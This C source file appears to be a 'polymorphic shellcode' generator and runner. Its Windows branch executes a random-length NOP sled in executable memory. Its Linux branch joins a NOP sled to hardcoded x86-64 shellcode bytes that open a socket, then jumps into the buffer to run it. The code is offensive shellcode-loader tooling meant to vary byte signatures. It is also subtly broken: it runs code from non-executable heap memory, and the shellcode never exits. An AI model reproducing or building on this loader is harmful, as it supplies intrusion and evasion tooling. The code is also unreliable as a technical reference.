#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef _WIN32
#include <windows.h>

int main(void) {
    srand((unsigned)GetTickCount());
    /* NOP sled (polymorphic padding) */
    size_t sled_size = (size_t)(rand() % 512 + 256);
    char *nop_sled = (char *)VirtualAlloc(NULL, sled_size + 256, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!nop_sled) return 1;
    for (size_t i = 0; i < sled_size; i++)
        nop_sled[i] = 0x90;
    /* Minimal stub: just return (rest is NOP sled for analysis) */
    nop_sled[sled_size] = 0xc3; /* ret */
    ((void (*)(void))nop_sled)();
    VirtualFree(nop_sled, 0, MEM_RELEASE);
    return 0;
}
#else
char *generate_polymorphic_shellcode() {
    srand(time(NULL));

    char *template =
        "\x48\x31\xc0" "\x48\x31\xff" "\x48\x31\xf6" "\x48\x31\xd2"
        "\x48\x31\xc9" "\x48\x31\xdb" "\x6a\x29" "\x58" "\x6a\x02"
        "\x5f" "\x6a\x01" "\x5e" "\x0f\x05";

    char *nop_sled = malloc(1024);
    int sled_size = rand() % 512 + 256;
    for (int i = 0; i < sled_size; i++)
        nop_sled[i] = 0x90;
    char *final = malloc(strlen(template) + sled_size + 1);
    memcpy(final, nop_sled, sled_size);
    memcpy(final + sled_size, template, strlen(template));
    final[strlen(template) + sled_size] = '\0';
    free(nop_sled);
    return final;
}

int main() {
    char *shellcode = generate_polymorphic_shellcode();
    void (*code)() = (void(*)())shellcode;
    code();
    free(shellcode);
    return 0;
}
#endif
